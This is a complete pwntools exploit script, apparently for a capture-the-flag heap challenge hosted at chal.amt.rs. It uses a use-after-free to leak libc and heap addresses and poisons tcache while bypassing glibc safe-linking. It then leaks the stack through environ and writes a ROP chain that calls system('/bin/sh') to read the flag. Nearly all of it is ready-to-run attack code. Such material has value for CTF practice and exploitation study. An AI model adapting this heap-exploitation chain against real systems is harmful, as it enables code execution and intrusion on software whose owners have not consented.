#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chal'
elf = context.binary = ELF(exe, checksec=True)
libc = './lib/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'chal.amt.rs', 1346

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *main+333
'''.format(**locals())
# break *db_menu+256
# break *db_line+394

# =========================================================
#                         EXPLOITS
# =========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'./lib'

def create(idx, key_len, key, value_len, value):
    io.sendlineafter('>>>', b'1')
    io.sendlineafter('>>>', str(idx).encode())
    io.sendlineafter('>>>', str(key_len).encode())
    io.sendlineafter('>>>', key)
    io.sendlineafter('>>>', str(value_len).encode())
    io.sendlineafter('>>>', value)
    
def update(idx, value):
    io.sendlineafter('>>>', b'2')
    io.sendlineafter('>>>', str(idx).encode())
    io.sendlineafter('>>>', value)

def read(idx):
    io.sendlineafter('>>>', b'3')
    io.sendlineafter('>>>', str(idx).encode())

def delete(idx):
    io.sendlineafter('>>>', b'4')
    io.sendlineafter('>>>', str(idx).encode())

def encode_leak(leak):
    res = []

    while(len(leak) > 0):
        if leak[:2] == b'\\x':
            res.append(leak[2:4].decode()[::-1])
            leak = leak[4:]
        else:
            res.append(hex(ord(leak[:1]))[2:][::-1])
            leak = leak[1:]

    return int(''.join(res)[::-1], 16)

def demangle(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def exploit():
    global io
    io = initialize()

    for i in range(4):
        create(i, 0x100, f'KEY-{i}'.encode(), 0x100, f'IDX-{i}'.encode())
    create(4, 0x10, b'protect', 0x10, b'protect')

    # fill tcache
    for i in range(4):
        delete(i)

    # unsorted bin
    read(3)
    io.recvuntil(b'val = ')
    leak = encode_leak(io.recvuntil(b'\\x00', drop=True))
    libc.address = leak - 0x21ace0

    read(2)
    io.recvuntil(b'val = ')
    leak = encode_leak(io.recvuntil(b'\\x00', drop=True))
    heap = demangle(leak) - 0x6e0

    # clean bins
    for i in range(4):
        create(i, 0x100, f'KEY-{i}'.encode(), 0x100, f'IDX-{i}'.encode())

    create(5, 0x40, b'VICTIM', 0x40, b'VICTIM')
    delete(5)

    target = mangle(heap, libc.sym['environ'] - 0x10)
    update(5, p64(target))

    create(6, 0x40, b'nothing', 0x40, b'A'*10+b'B'*4)
    read(6)
    io.recvuntil(b'BBBB')
    io.recvuntil(b'\\x00')
    io.recvuntil(b'\\x00')
    leak = encode_leak(io.recvuntil(b'\\x00', drop=True))
    stack = leak

    create(7, 0x60, b'VICTIM', 0x60, b'VICTIM')
    delete(7)

    rip = mangle(heap, stack - 0x120 - 0x8)
    update(7, p64(rip))

    offset = 0x8
    payload = flat({
        offset: [
            libc.address + 0x02a3e5, # pop rdi; ret;
            next(libc.search(b'/bin/sh\x00')),
            libc.address + 0x029139, # ret;
            libc.sym['system']
        ]
    })
    create(8, 0x60, b'VICTIM', 0x60, payload)

    # return trigger ROP
    io.sendlineafter('>>>', b'5')

    sleep(1)
    io.send(b'cat flag*')

    info('leak: %#x', leak)
    info('heap base: %#x', heap)
    info('libc base: %#x', libc.address)
    info('libc environ: %#x', libc.sym['environ'])
    info('stack: %#x', stack)
    io.interactive()
    
if __name__ == '__main__':
    exploit()